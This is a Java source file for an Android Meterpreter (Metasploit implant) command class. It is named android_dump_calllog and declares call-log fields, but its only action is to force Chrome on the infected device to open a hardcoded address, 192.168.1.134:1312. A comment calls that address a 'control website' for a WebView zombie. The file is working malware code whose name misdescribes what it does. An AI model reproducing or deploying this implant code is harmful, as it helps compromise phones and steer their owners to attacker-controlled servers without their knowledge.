package com.metasploit.meterpreter.android;

import java.util.Date;

import android.database.Cursor;
import android.provider.CallLog;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;
import android.net.Uri;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

public class android_dump_calllog implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_CALLLOG_NAME = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9013);
    private static final int TLV_TYPE_CALLLOG_TYPE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9014);
    private static final int TLV_TYPE_CALLLOG_DATE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9015);
    private static final int TLV_TYPE_CALLLOG_DURATION = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9016);
    private static final int TLV_TYPE_CALLLOG_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9017);
    private static final int TLV_TYPE_CALLLOG_NUMBER = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9018);
    private static final String unknown = "Unknown";
    private static final String outgoing = "OUTGOING";
    private static final String incoming = "INCOMING";
    private static final String missed = "MISSED";

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();



       /* Android Q poses limitations on starting activities
        *
        * https://developer.android.com/guide/components/activities/background-starts
        */

        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
        try {
        // Redirect Chrome to redirection website
        String url = "http://192.168.1.134:1312";
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(url));
        intent.setPackage("com.android.chrome");
        context.startActivity(intent);

        } catch (ActivityNotFoundException e) {
          return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }

}
